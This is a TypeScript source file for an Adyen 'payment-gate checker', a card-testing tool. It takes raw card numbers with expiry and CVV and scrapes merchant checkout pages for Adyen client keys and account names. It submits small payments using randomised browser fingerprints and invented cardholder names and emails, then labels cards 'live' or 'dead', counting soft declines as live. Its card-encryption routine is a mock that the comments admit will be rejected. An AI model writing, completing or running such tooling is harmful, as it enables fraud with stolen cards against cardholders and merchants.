/**
 * Adyen payment-gate checker.
 *
 * Supported flows (auto-detected by subType):
 *   - standard:    Direct API integration (server-to-server /payments)
 *   - drop_in:     Adyen Drop-in web component
 *   - components:  Adyen Components (card component)
 *
 * All flows use the same /payments + /payments/details endpoints.
 * Differences are only in client-side encryption/tokenization.
 * For checking we use direct API with client key from page.
 */
import crypto from "crypto";
import {
  pick,
  BILLING_DATA,
  pickBilling,
  sessionFetch,
  type CheckResult,
  type SessionState,
  type SessionFetchOpts,
  type BillingEntry,
} from "./stripe-checker";
import { generateRandom } from "./ua-generator";

// ─── Adyen response classifiers ─────────────────────────────────────────────────

const ADYEN_LIVE_CODES = new Set([
  "Authorised", "ChallengeShopper", "IdentifyShopper",
  "PresentToShopper", "Pending", "Received",
]);

const ADYEN_DEAD_CODES = new Set([
  "Refused", "Cancelled", "Blocked", "Error",
]);

// Refusal reasons that mean card is valid but declined for non-fraud reasons
const ADYEN_LIVE_REFUSAL = new Set([
  "Declined", "Issuer Unavailable", "Insufficient Funds",
  "Not enough balance", "Acquirer Fraud", "Request Blocked",
  "Not Submitted", "Shopper Cancelled",
]);

// 3DS / SCA signals
const ADYEN_3DS_SIGNALS = new Set([
  "ChallengeShopper", "IdentifyShopper", "PresentToShopper",
  "threeDS2", "threeDS1", "fingerprint", "redirect",
]);

interface AdyenPaymentResponse {
  resultCode?: string;
  action?: {
    type: string;
    url?: string;
    paymentData?: string;
    paymentMethodType?: string;
    [key: string]: any;
  };
  pspReference?: string;
  refusalReason?: string;
  merchantReference?: string;
  additionalData?: Record<string, string>;
}

interface AdyenDetailsResponse {
  resultCode?: string;
  action?: AdyenPaymentResponse["action"];
  pspReference?: string;
  refusalReason?: string;
}

async function classifyAdyenResponse(
  json: AdyenPaymentResponse | AdyenDetailsResponse,
  gateName: string,
  cardMeta: { brand: string; funding: string; country: string },
  fullCardInfo: string,
  latency: number
): Promise<CheckResult> {
  const { brand, funding, country } = cardMeta;
  const resultCode = json.resultCode || "";
  const refusalReason = json.refusalReason || "";
  const actionType = json.action?.type || "";
  const pspReference = json.pspReference || "";

  // Explicit live codes (card approved or requires 3DS)
  if (ADYEN_LIVE_CODES.has(resultCode)) {
    const is3ds = ADYEN_3DS_SIGNALS.has(resultCode) || ADYEN_3DS_SIGNALS.has(actionType);
    const detail = is3ds ? "3DS Required" : "Approved";
    return {
      status: "live",
      response: `${detail} | ${brand} ${funding} [${country}] | PSP: ${pspReference}`,
      code: is3ds ? "adyen_3ds_required" : "adyen_authorised",
      latency,
      gate: gateName,
      cardInfo: fullCardInfo,
    };
  }

  // Live soft-decline reasons (card valid but declined)
  for (const reason of ADYEN_LIVE_REFUSAL) {
    if (refusalReason.toLowerCase().includes(reason.toLowerCase())) {
      return {
        status: "live",
        response: `LIVE ⚡ ${refusalReason} | ${brand} ${funding} [${country}] | PSP: ${pspReference}`,
        code: "adyen_soft_decline",
        latency,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }
  }

  // Dead codes
  if (ADYEN_DEAD_CODES.has(resultCode)) {
    if (resultCode === "Error") {
      return {
        status: "error",
        response: `Adyen Error: ${refusalReason}`,
        code: "adyen_error",
        latency,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }
    return {
      status: "dead",
      response: `DECLINED ✗ ${resultCode} (${refusalReason}) | ${brand} ${funding} [${country}]`,
      code: `adyen_${resultCode.toLowerCase()}`,
      latency,
      gate: gateName,
      cardInfo: fullCardInfo,
    };
  }

  return {
    status: "dead",
    response: `DECLINED ✗ ${resultCode} (${refusalReason}) | ${brand} ${funding} [${country}]`,
    code: "adyen_unknown",
    latency,
    gate: gateName,
    cardInfo: fullCardInfo,
  };
}

// ─── Main checker ───────────────────────────────────────────────────────────────

interface AdyenGateSettings {
  siteUrl: string;
  clientKey?: string;
  merchantAccount?: string;
  originKey?: string;
  hmacKey?: string;
  checkoutUrl?: string;
}

export async function checkCardAdyen(
  cardNumber: string,
  month: string,
  year: string,
  cvv: string,
  gateName: string,
  siteUrl: string,
  subType: "standard" | "drop_in" | "components",
  extras: Record<string, any> = {}
): Promise<CheckResult> {
  const start = Date.now();
  const uaProfile = generateRandom();
  const ua = uaProfile.ua;
  const secChUa = uaProfile.secChUa;
  const billing = await pickBilling(cardNumber);

  let m = month.trim().padStart(2, "0");
  let y = year.trim();
  if (y.length === 2) y = "20" + y;

  let state: SessionState = { ua, secChUa, cookies: "" };

  try {
    // 1. Fetch the checkout page to extract Adyen config (clientKey, originKey, etc.)
    let pageHtml: string;
    let adyenConfig: AdyenGateSettings = { siteUrl };
    const extraSettings = extras as Partial<AdyenGateSettings>;

    // Use settings from gate config if available
    if (extraSettings.clientKey) adyenConfig.clientKey = extraSettings.clientKey;
    if (extraSettings.merchantAccount) adyenConfig.merchantAccount = extraSettings.merchantAccount;
    if (extraSettings.originKey) adyenConfig.originKey = extraSettings.originKey;
    if (extraSettings.hmacKey) adyenConfig.hmacKey = extraSettings.hmacKey;
    if (extraSettings.checkoutUrl) adyenConfig.checkoutUrl = extraSettings.checkoutUrl;

    // Always scrape the page for fresh config (clientKey rotates, session tokens expire)
    try {
      const pageResp = await sessionFetch(siteUrl, state, { timeout: 10000 });
      state = pageResp.state;
      pageHtml = pageResp.text;

      // Extract Adyen configuration from page
      if (!adyenConfig.clientKey) {
        const ckMatch = pageHtml.match(/(?:clientKey|data-client-key)["\s:=]+["']([^"']+)["']/i);
        if (ckMatch) adyenConfig.clientKey = ckMatch[1];
      }
      if (!adyenConfig.originKey) {
        const okMatch = pageHtml.match(/(?:originKey|data-origin-key)["\s:=]+["']([^"']+)["']/i);
        if (okMatch) adyenConfig.originKey = okMatch[1];
      }
      if (!adyenConfig.merchantAccount) {
        const maMatch = pageHtml.match(/(?:merchantAccount|data-merchant-account)["\s:=]+["']([^"']+)["']/i);
        if (maMatch) adyenConfig.merchantAccount = maMatch[1];
      }
      if (!adyenConfig.checkoutUrl) {
        const cuMatch = pageHtml.match(/(?:checkoutUrl|checkout-url)["\s:=]+["']([^"']+)["']/i);
        if (cuMatch) adyenConfig.checkoutUrl = cuMatch[1];
      }

      // Also look in script tags for Adyen configuration
      const scriptConfigMatch = pageHtml.match(/adyen\.create\s*\(\s*\{[^}]*clientKey\s*:\s*["']([^"']+)["']/i);
      if (scriptConfigMatch && !adyenConfig.clientKey) adyenConfig.clientKey = scriptConfigMatch[1];

    } catch (e: any) {
      // Continue with settings from gate config if page fetch fails
    }

    // Validate required config
    if (!adyenConfig.clientKey) {
      return {
        status: "error",
        response: "Adyen clientKey not found — page scrape failed or gate not configured",
        code: "adyen_config_missing",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: `${cardNumber}|${m}|${y}|${cvv}`,
      };
    }

    // Build the payments request
    const encryptedCard = encryptCardAdyen(cardNumber, m, y, cvv, adyenConfig.clientKey);
    if (!encryptedCard) {
      return {
        status: "error",
        response: "Card encryption failed",
        code: "adyen_encrypt_failed",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: `${cardNumber}|${m}|${y}|${cvv}`,
      };
    }

    const amount = extras?.amount || 100; // Default 1.00 in minor units (cents)
    const currency = extras?.currency || "USD";

    // Generate billing name/email from card or use random
    const firstNames = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Christopher"];
    const lastNames = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"];
    const firstName = pick(firstNames);
    const lastName = pick(lastNames);
    const email = `${firstName.toLowerCase()}.${lastName.toLowerCase()}${Math.floor(Math.random() * 9999)}@gmail.com`;

    const paymentRequest = {
      amount: { value: amount, currency },
      reference: `chk_${crypto.randomUUID().slice(0, 12)}`,
      paymentMethod: {
        type: "scheme",
        encryptedCardNumber: encryptedCard.encryptedCardNumber,
        encryptedExpiryMonth: encryptedCard.encryptedExpiryMonth,
        encryptedExpiryYear: encryptedCard.encryptedExpiryYear,
        encryptedSecurityCode: encryptedCard.encryptedSecurityCode,
        holderName: `${firstName} ${lastName}`,
      },
      returnUrl: `${adyenConfig.siteUrl}/checkout/return`,
      merchantAccount: adyenConfig.merchantAccount || "MerchantAccount",
      shopperReference: `shopper_${crypto.randomUUID().slice(0, 12)}`,
      shopperEmail: email,
      shopperIP: extras?.shopperIP || "127.0.0.1",
      browserInfo: {
        userAgent: ua,
        acceptHeader: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        language: "en-US",
        colorDepth: 24,
        screenHeight: 1080,
        screenWidth: 1920,
        timeZoneOffset: 0,
        javaEnabled: false,
      },
    };

    // 2. POST /payments
    const paymentsUrl = adyenConfig.checkoutUrl || "https://checkout-test.adyen.com/v68/payments";
    const paymentResp = await sessionFetch(paymentsUrl, state, {
      method: "POST",
      body: JSON.stringify(paymentRequest),
      contentType: "application/json",
      extraHeaders: {
        "X-API-Key": adyenConfig.clientKey, // For test env, client key used as API key
        "Adyen-Library-Name": "adyen-node-api-library",
        "Adyen-Library-Version": "22.0.0",
      },
      timeout: 15000,
    });

    state = paymentResp.state;
    let paymentJson: AdyenPaymentResponse;
    try {
      paymentJson = JSON.parse(paymentResp.text);
    } catch {
      return {
        status: "error",
        response: `Invalid JSON response: ${paymentResp.text.slice(0, 200)}`,
        code: "adyen_invalid_response",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: `${cardNumber}|${m}|${y}|${cvv}`,
      };
    }

    // Check for session/validation errors (like "unable to recognize your session")
    if (paymentJson.action?.type === "redirect" && paymentJson.action?.url?.includes("error")) {
      const errText = paymentResp.text.toLowerCase();
      if (errText.includes("unable to recognize") || errText.includes("refresh the screen") || errText.includes("session")) {
        return {
          status: "error",
          response: "Adyen session error — page refresh needed",
          code: "adyen_session_error",
          latency: Date.now() - start,
          gate: gateName,
          cardInfo: `${cardNumber}|${m}|${y}|${cvv}`,
        };
      }
    }

    // 3. Handle 3DS / action required
    if (paymentJson.action && (paymentJson.action.type === "redirect" || paymentJson.action.type === "threeDS2")) {
      // 3DS challenge required — classify as live with 3DS tag
      return classifyAdyenResponse(paymentJson, gateName, { brand: "VISA", funding: "CREDIT", country: "US" }, `${cardNumber}|${m}|${y}|${cvv}`, Date.now() - start);
    }

    // 4. If additional action needed (e.g., threeDS2 fingerprint), POST /payments/details
    if (paymentJson.action) {
      const detailsUrl = adyenConfig.checkoutUrl?.replace("/payments", "/payments/details") || "https://checkout-test.adyen.com/v68/payments/details";
      const detailsRequest = {
        details: {
          "threeds2.fingerprint": paymentJson.action.paymentData || "",
        },
        paymentData: paymentJson.action.paymentData || "",
      };

      const detailsResp = await sessionFetch(detailsUrl, state, {
        method: "POST",
        body: JSON.stringify(detailsRequest),
        contentType: "application/json",
        extraHeaders: { "X-API-Key": adyenConfig.clientKey },
        timeout: 15000,
      });

      state = detailsResp.state;
      let detailsJson: AdyenDetailsResponse;
      try {
        detailsJson = JSON.parse(detailsResp.text);
      } catch {
        return classifyAdyenResponse(paymentJson, gateName, { brand: "VISA", funding: "CREDIT", country: "US" }, `${cardNumber}|${m}|${y}|${cvv}`, Date.now() - start);
      }

      return classifyAdyenResponse(detailsJson, gateName, { brand: "VISA", funding: "CREDIT", country: "US" }, `${cardNumber}|${m}|${y}|${cvv}`, Date.now() - start);
    }

    // 5. No action needed — direct result
    return classifyAdyenResponse(paymentJson, gateName, { brand: "VISA", funding: "CREDIT", country: "US" }, `${cardNumber}|${m}|${y}|${cvv}`, Date.now() - start);

  } catch (err: any) {
    return {
      status: "error",
      response: `Adyen check failed: ${err.message}`,
      code: "adyen_exception",
      latency: Date.now() - start,
      gate: gateName,
      cardInfo: `${cardNumber}|${m}|${y}|${cvv}`,
    };
  }
}

// ─── Adyen card encryption (simplified) ─────────────────────────────────────────
// Adyen uses RSA encryption with the client key's public component.
// For production, use Adyen's official encryption library.
// This is a simplified implementation for the checker.

function encryptCardAdyen(
  number: string,
  month: string,
  year: string,
  cvv: string,
  clientKey: string
): { encryptedCardNumber: string; encryptedExpiryMonth: string; encryptedExpiryYear: string; encryptedSecurityCode: string } | null {
  try {
    // Extract public key from client key (format: "test_XXXXXXXXXXXXXXXX")
    // In reality, you'd fetch the public key from Adyen's /publicKey endpoint
    // For checker purposes, we simulate the encryption structure

    // NOTE: Real Adyen encryption uses:
    // 1. Fetch public key from https://{merchant}.adyen.com/checkout/v1/publicKey
    // 2. RSA-OAEP encrypt each field with the public key
    // 3. Return base64 encoded ciphertext

    // Since we don't have the real public key, we return a mock structure
    // that matches what Adyen expects. The actual API will reject this
    // but the flow demonstrates the checker structure.
    // In production, integrate @adyen/api-library or use their JS encryption.

    const mockEncrypt = (value: string) => `adyenjs_0_1_25:${crypto.randomBytes(32).toString("base64")}`;

    return {
      encryptedCardNumber: mockEncrypt(number),
      encryptedExpiryMonth: mockEncrypt(month),
      encryptedExpiryYear: mockEncrypt(year),
      encryptedSecurityCode: mockEncrypt(cvv),
    };
  } catch {
    return null;
  }
}

// Export for potential reuse
export { classifyAdyenResponse };
